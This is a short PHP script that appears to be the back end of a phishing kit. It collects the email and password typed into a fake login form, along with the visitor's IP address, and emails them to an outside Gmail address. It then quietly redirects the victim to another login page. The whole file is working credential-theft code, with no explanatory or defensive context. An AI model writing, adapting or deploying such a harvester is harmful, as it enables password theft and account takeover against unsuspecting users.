<?

$ip = getenv("REMOTE_ADDR");
$message .= "Email Address  : ".$_POST['session_key']."\n";
$message .= "password : ".$_POST['session_password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-------PHP Created---------\n";

$recipient = "admlogs0@gmail.com";
$subject = "LoGin";
$headers = "";
     mail("$to", $subject, $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: login_user.php");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?> 